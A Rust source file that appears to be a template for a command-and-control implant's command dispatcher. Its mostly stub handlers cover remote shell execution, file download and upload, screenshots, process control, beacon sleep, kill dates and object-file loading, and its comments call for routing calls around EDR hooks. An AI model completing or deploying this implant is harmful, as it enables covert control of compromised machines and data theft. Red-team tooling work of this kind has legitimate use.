// __NAME__ Agent — Commander Module
//
// Command dispatch and handler stubs for all supported commands.
// Each handler receives unpacked command data and returns a response
// (or None for fire-and-forget commands).
//
// Actual pack/unpack logic depends on the protocol overlay. This base
// template documents the expected parameter/response layout for each
// command and provides the dispatch skeleton.

#![allow(dead_code)]

use crate::protocol;
use crate::agent::Agent;

/// Protocol-neutral view of a decoded task.
///
/// Base templates do not dictate how bytes are framed on the wire. A protocol
/// overlay is expected to unpack raw traffic into one or more `TaskView`
/// records, then call `dispatch_tasks()` or `dispatch()` below.
pub struct TaskView<'a> {
    pub code: u32,
    pub id: u32,
    pub data: &'a [u8],
}

/// Dispatch a batch of already-decoded tasks.
///
/// Returns `(task_id, response_bytes)` tuples only for handlers that produced a
/// response. The protocol overlay remains responsible for serializing these
/// responses back into its own wire format.
pub fn dispatch_tasks(agent: &mut Agent, tasks: &[TaskView<'_>]) -> Vec<(u32, Vec<u8>)> {
    let mut responses = Vec::new();
    for task in tasks {
        if let Some(resp) = dispatch(agent, task.code, task.id, task.data) {
            responses.push((task.id, resp));
        }
    }
    responses
}

/// Dispatch a single command and return an optional response.
pub fn dispatch(agent: &mut Agent, cmd_code: u32, cmd_id: u32, data: &[u8]) -> Option<Vec<u8>> {
    match cmd_code {
        protocol::COMMAND_EXIT          => cmd_terminate(agent),
        protocol::COMMAND_FS_LIST       => cmd_fs_list(agent, cmd_id, data),
        protocol::COMMAND_FS_UPLOAD     => cmd_fs_upload(agent, cmd_id, data),
        protocol::COMMAND_FS_DOWNLOAD   => cmd_fs_download(agent, cmd_id, data),
        protocol::COMMAND_FS_REMOVE     => cmd_fs_remove(agent, cmd_id, data),
        protocol::COMMAND_FS_MKDIRS     => cmd_fs_mkdirs(agent, cmd_id, data),
        protocol::COMMAND_FS_COPY       => cmd_fs_copy(agent, cmd_id, data),
        protocol::COMMAND_FS_MOVE       => cmd_fs_move(agent, cmd_id, data),
        protocol::COMMAND_FS_CD         => cmd_fs_cd(agent, cmd_id, data),
        protocol::COMMAND_FS_PWD        => cmd_fs_pwd(agent, cmd_id, data),
        protocol::COMMAND_FS_CAT        => cmd_fs_cat(agent, cmd_id, data),
        protocol::COMMAND_OS_RUN        => cmd_os_run(agent, cmd_id, data),
        protocol::COMMAND_OS_INFO       => cmd_os_info(agent, cmd_id, data),
        protocol::COMMAND_OS_PS         => cmd_os_ps(agent, cmd_id, data),
        protocol::COMMAND_OS_SCREENSHOT => cmd_os_screenshot(agent, cmd_id, data),
        protocol::COMMAND_OS_SHELL      => cmd_os_shell(agent, cmd_id, data),
        protocol::COMMAND_OS_KILL       => cmd_os_kill(agent, cmd_id, data),
        protocol::COMMAND_PROFILE_SLEEP     => cmd_profile_sleep(agent, cmd_id, data),
        protocol::COMMAND_PROFILE_KILLDATE  => cmd_profile_killdate(agent, cmd_id, data),
        protocol::COMMAND_PROFILE_WORKTIME  => cmd_profile_worktime(agent, cmd_id, data),
        protocol::COMMAND_EXEC_BOF      => cmd_exec_bof(agent, cmd_id, data),
        protocol::COMMAND_EXEC_BOF_ASYNC => cmd_exec_bof_async(agent, cmd_id, data),
        protocol::COMMAND_JOB_LIST      => cmd_job_list(agent, cmd_id, data),
        protocol::COMMAND_JOB_KILL      => cmd_job_kill(agent, cmd_id, data),
        _ => None,
    }
}

// ── Terminate ──────────────────────────────────────────────────────────────────

fn cmd_terminate(agent: &mut Agent) -> Option<Vec<u8>> {
    agent.active = false;
    None
}

// ── File system commands ───────────────────────────────────────────────────────

fn cmd_fs_list(_agent: &mut Agent, _cmd_id: u32, _data: &[u8]) -> Option<Vec<u8>> {
    // Unpack: path (string)
    // Action: std::fs::read_dir(path) — stubs for EDR-hooked OS calls
    // Response: RESP_FS_LIST { path, entries[] { name, is_dir, size, mod_time } }
    // TODO: Implement with platform-specific read_dir or evasion gate
    None
}

fn cmd_fs_upload(_agent: &mut Agent, _cmd_id: u32, _data: &[u8]) -> Option<Vec<u8>> {
    // Unpack: path (string), file_data (bytes)
    // Action: std::fs::write(path, data)
    // Response: RESP_FS_UPLOAD { path }
    // TODO: Implement — write may be hooked; consider evasion gate
    None
}

fn cmd_fs_download(_agent: &mut Agent, _cmd_id: u32, _data: &[u8]) -> Option<Vec<u8>> {
    // Unpack: path (string)
    // Action: std::fs::read(path)
    // Response: RESP_FS_DOWNLOAD { path, data (bytes) }
    // TODO: Implement — read may be hooked; consider evasion gate
    None
}

fn cmd_fs_remove(_agent: &mut Agent, _cmd_id: u32, _data: &[u8]) -> Option<Vec<u8>> {
    // Unpack: path (string)
    // Action: std::fs::remove_file/remove_dir_all
    // Response: RESP_COMPLETE
    None
}

fn cmd_fs_mkdirs(_agent: &mut Agent, _cmd_id: u32, _data: &[u8]) -> Option<Vec<u8>> {
    // Unpack: path (string)
    // Action: std::fs::create_dir_all(path)
    // Response: RESP_COMPLETE
    None
}

fn cmd_fs_copy(_agent: &mut Agent, _cmd_id: u32, _data: &[u8]) -> Option<Vec<u8>> {
    // Unpack: src (string), dst (string)
    // Action: std::fs::copy (file) or recursive walk (directory)
    // Response: RESP_COMPLETE
    None
}

fn cmd_fs_move(_agent: &mut Agent, _cmd_id: u32, _data: &[u8]) -> Option<Vec<u8>> {
    // Unpack: src (string), dst (string)
    // Action: std::fs::rename
    // Response: RESP_COMPLETE
    None
}

fn cmd_fs_cd(_agent: &mut Agent, _cmd_id: u32, _data: &[u8]) -> Option<Vec<u8>> {
    // Unpack: path (string)
    // Action: std::env::set_current_dir
    // Response: RESP_COMPLETE
    None
}

fn cmd_fs_pwd(_agent: &mut Agent, _cmd_id: u32, _data: &[u8]) -> Option<Vec<u8>> {
    // Unpack: (none)
    // Action: std::env::current_dir
    // Response: RESP_FS_PWD { path }
    None
}

fn cmd_fs_cat(_agent: &mut Agent, _cmd_id: u32, _data: &[u8]) -> Option<Vec<u8>> {
    // Unpack: path (string)
    // Action: std::fs::read_to_string
    // Response: RESP_FS_CAT { content (string) }
    None
}

// ── OS commands ────────────────────────────────────────────────────────────────

fn cmd_os_run(_agent: &mut Agent, _cmd_id: u32, _data: &[u8]) -> Option<Vec<u8>> {
    // Unpack: command (string), output (bool), wait (bool)
    // Action: std::process::Command — hooked by EDR
    // Response: RESP_OS_RUN { output (string) }
    // TODO: Implement via evasion gate — CreateProcess/execve are hooked
    None
}

fn cmd_os_info(_agent: &mut Agent, _cmd_id: u32, _data: &[u8]) -> Option<Vec<u8>> {
    // Unpack: (none)
    // Action: Gather hostname, username, domain, OS version, PID, etc.
    // Response: RESP_OS_INFO { hostname, username, domain, internal_ip,
    //           os, os_version, os_arch, elevated, process_id, process_name, code_page }
    // TODO: Implement via evasion gate — OS queries are hooked
    None
}

fn cmd_os_ps(_agent: &mut Agent, _cmd_id: u32, _data: &[u8]) -> Option<Vec<u8>> {
    // Unpack: (none)
    // Action: Process enumeration (platform-specific)
    // Response: RESP_OS_PS { processes[] { pid, ppid, name, user, arch, session } }
    // TODO: Implement via evasion gate — process enumeration is heavily hooked
    None
}

fn cmd_os_screenshot(_agent: &mut Agent, _cmd_id: u32, _data: &[u8]) -> Option<Vec<u8>> {
    // Unpack: (none)
    // Action: Screen capture (platform-specific)
    // Response: RESP_OS_SCREENSHOT { image (bytes) }
    // TODO: Implement via evasion gate
    None
}

fn cmd_os_shell(_agent: &mut Agent, _cmd_id: u32, _data: &[u8]) -> Option<Vec<u8>> {
    // Unpack: command (string)
    // Action: shell interpreter (cmd.exe /c or /bin/sh -c) — hooked by EDR
    // Response: RESP_OS_SHELL { output (string) }
    // TODO: Implement via evasion gate
    None
}

fn cmd_os_kill(_agent: &mut Agent, _cmd_id: u32, _data: &[u8]) -> Option<Vec<u8>> {
    // Unpack: pid (uint32)
    // Action: TerminateProcess / kill(pid, SIGKILL) — hooked by EDR
    // Response: RESP_COMPLETE
    // TODO: Implement via evasion gate
    None
}

// ── Profile tuning ─────────────────────────────────────────────────────────────

fn cmd_profile_sleep(agent: &mut Agent, _cmd_id: u32, _data: &[u8]) -> Option<Vec<u8>> {
    // Unpack: sleep (uint32, seconds), jitter (uint32, 0-90%)
    // Protocol overlay provides the unpacker. Placeholder:
    //   let sleep_s = reader.read_u32()?;
    //   let jitter  = reader.read_u32()?;
    //   agent.sleep_ms = (sleep_s as u64) * 1000;
    //   agent.jitter   = jitter;
    let _ = agent;
    // Response: RESP_COMPLETE
    None
}

fn cmd_profile_killdate(agent: &mut Agent, _cmd_id: u32, _data: &[u8]) -> Option<Vec<u8>> {
    // Unpack: kill_date (int64, unix timestamp)
    //   agent.kill_date = reader.read_i64()?;
    let _ = agent;
    // Response: RESP_COMPLETE
    None
}

fn cmd_profile_worktime(agent: &mut Agent, _cmd_id: u32, _data: &[u8]) -> Option<Vec<u8>> {
    // Unpack: work_start (int32, HHMM), work_end (int32, HHMM)
    //   agent.work_start = reader.read_i32()?;
    //   agent.work_end   = reader.read_i32()?;
    let _ = agent;
    // Response: RESP_COMPLETE
    None
}

// ── BOF execution ──────────────────────────────────────────────────────────────

fn cmd_exec_bof(_agent: &mut Agent, _cmd_id: u32, _data: &[u8]) -> Option<Vec<u8>> {
    // Unpack: object (bytes, .o file), argspack (string), task (string)
    //
    // Sync execution:
    //   let ctx = bof::object_execute(&object, &args)?;
    //   for msg in &ctx.msgs {
    //       // msg.msg_type — CALLBACK_OUTPUT, CALLBACK_ERROR, CALLBACK_AX_*, BOF_ERROR_*
    //       // msg.data     — output bytes
    //   }
    //
    // Response: COMMAND_EXEC_BOF_OUT { msgs[] { type, data } }
    // TODO: Port bof_loader logic to Rust or link C bof_loader via FFI
    None
}

fn cmd_exec_bof_async(_agent: &mut Agent, _cmd_id: u32, _data: &[u8]) -> Option<Vec<u8>> {
    // Same as cmd_exec_bof but spawned in a background thread.
    // Register as a job via agent.jobs.add(JOB_TYPE_BOF).
    // Return start marker immediately; stream output via COMMAND_EXEC_BOF_OUT.
    // TODO: Implement async path + job registration
    None
}

// ── Job management ─────────────────────────────────────────────────────────────

fn cmd_job_list(agent: &mut Agent, _cmd_id: u32, _data: &[u8]) -> Option<Vec<u8>> {
    // Unpack: (none)
    // Action: agent.jobs.list() → Vec<(job_id, job_type, state)>
    // Response: RESP_COMPLETE { list serialized via protocol }
    let _entries = agent.jobs.list();
    // TODO: Serialize entries via protocol overlay packer
    None
}

fn cmd_job_kill(agent: &mut Agent, _cmd_id: u32, _data: &[u8]) -> Option<Vec<u8>> {
    // Unpack: job_id (uint32)
    // Action: agent.jobs.kill(job_id)
    // Response: RESP_COMPLETE
    let _ = agent;
    // TODO: Read job_id from data via protocol overlay unpacker
    None
}
